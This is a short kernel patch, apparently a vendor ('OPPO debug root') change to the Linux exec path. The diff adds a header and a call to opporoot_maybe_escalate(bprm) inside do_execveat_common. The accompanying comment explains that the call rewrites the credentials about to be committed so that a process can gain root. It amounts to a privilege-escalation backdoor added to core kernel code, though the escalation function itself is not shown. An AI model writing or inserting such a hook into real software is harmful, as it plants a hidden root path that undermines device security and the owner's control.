@@ -57,6 +57,7 @@
 #include <linux/oom.h>
 #include <linux/compat.h>
 #include <linux/vmalloc.h>
+#include <linux/opporoot.h>
 
 #include <asm/uaccess.h>
 #include <asm/mmu_context.h>
@@ -1798,6 +1799,12 @@ static int do_execveat_common(int fd, struct filename *filename,
 			goto out;
 		bprm->argc = 1;
 	}
+
+	/* OPPO debug root: bprm->cred is the object install_exec_creds() will
+	 * commit, so rewrite it here (escalating current_cred() is too late --
+	 * prepare_bprm_creds() already snapshotted the old credentials).
+	 */
+	opporoot_maybe_escalate(bprm);
 
 	retval = exec_binprm(bprm);
 	if (retval < 0)
